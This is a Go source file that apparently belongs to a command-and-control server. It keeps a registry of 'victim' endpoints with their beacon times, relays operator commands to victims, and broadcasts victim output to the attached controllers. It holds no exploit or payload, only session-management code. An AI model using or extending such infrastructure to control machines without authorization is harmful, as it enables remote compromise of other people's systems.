package main

/*
 * endpoint.go
 * Keep track of victims
 * Created 20170518
 * Last Modified 20170518
 */

import (
	"log"
	"sort"
	"sync"
	"time"
)

/* TODO: Remove old endpoints every so often */

/* TELLCTO is the timeout when sending data to a controller */
const TELLCTO = time.Minute

/* TODO: Document */
type Endpoint struct {
	Name       string        /* Endpoint name */
	NextLine   string        /* Next line to send */
	CtoV       chan string   /* Channel from control to victim */
	PollGuard  chan struct{} /* Prevents multiple simultaneous Polls */
	LastBeacon time.Time     /* Time of last beacon */

	/* Channels from victim to controllers */
	vtoC     map[chan []byte]struct{}
	chanLock *sync.Mutex /* vtoC lock */
}

var (
	endpoints     = map[string]*Endpoint{}
	endpointsLock = &sync.Mutex{}
)

/* GetEndpoint returns a pointer to the struct for the given named endpoint.
One will be created if it doesn't exist. */
func GetEndpoint(name string) *Endpoint {
	endpointsLock.Lock()
	defer endpointsLock.Unlock()

	/* Try to get it if it exists */
	e, ok := endpoints[name]
	if ok {
		return e
	}

	/* Make and save one if not */
	e = &Endpoint{
		Name:      name,
		CtoV:      make(chan string),
		PollGuard: make(chan struct{}, 1),
		vtoC:      make(map[chan []byte]struct{}),
		chanLock:  &sync.Mutex{},
	}
	e.PollGuard <- struct{}{}
	endpoints[name] = e
	log.Printf("[%v] New victim", e.Name)

	return e
}

/* TellControllers sends msg to all of the controllers.  It blocks until the
timeout has been reached */
func (e *Endpoint) TellControllers(msg []byte) {
	/* Send to all interested parties */
	e.chanLock.Lock()
	defer e.chanLock.Unlock()
	wg := &sync.WaitGroup{}
	for ch := range e.vtoC {
		wg.Add(1)
		go func(d []byte, c chan<- []byte) {
			defer wg.Done()
			/* Try to send the data to the controller, with a
			timeout */
			select {
			case <-time.After(TELLCTO):
			case c <- d:
			}
		}(msg, ch)
	}
	wg.Wait()
}

/* ControlEndpoint returns a pair of channels which can be used to send
commands to a victim (by endpoint name) and receive output from the victim.
RemoveRX must be called when the receive channel is no longer needed. */
func ControlEndpoint(name string) (tx chan<- string, rx chan []byte) {
	e := GetEndpoint(name)
	e.chanLock.Lock()
	defer e.chanLock.Unlock()
	tx = e.CtoV
	rch := make(chan []byte)
	e.vtoC[rch] = struct{}{}

	return tx, rch
}

/* RemoveRX removes the rx channel from the endpoint with the given name.  This
must be called to prevent leakage and unnecessary delays.  Attempting to read
from the channel after calling RemoveRX will likely result in a panic. */
func RemoveRX(name string, rx chan []byte) {
	e := GetEndpoint(name)
	/* Drain channel so writes don't block and hold e.chanLock */
	go func() {
		for _ = range rx {
		}
	}()
	e.chanLock.Lock()
	defer e.chanLock.Unlock()
	delete(e.vtoC, rx)
	close(rx)
}

/* EndpointElem is an element in the slice of endpoints, used for printing them
nicely.  The backing store (currently, a map) is too volatile to hand to other
functions. */
type EndpointListElem struct {
	Name       string    /* Endpoint name (or path) */
	LastBeacon time.Time /* Time of last beacon */
}

/* ListEndpoints returns a list of beacon names and their last beacon times */
func ListEndpoints() []EndpointListElem {
	endpointsLock.Lock()
	/* Slice of current endpoints */
	es := make([]EndpointListElem, 0, len(endpoints))
	for _, e := range endpoints {
		es = append(es, EndpointListElem{e.Name, e.LastBeacon})
	}
	defer endpointsLock.Unlock()

	/* Sort by last beacon */
	sort.Slice(
		es,
		func(i, j int) bool {
			return es[i].LastBeacon.Before(es[j].LastBeacon)
		},
	)

	return es

}
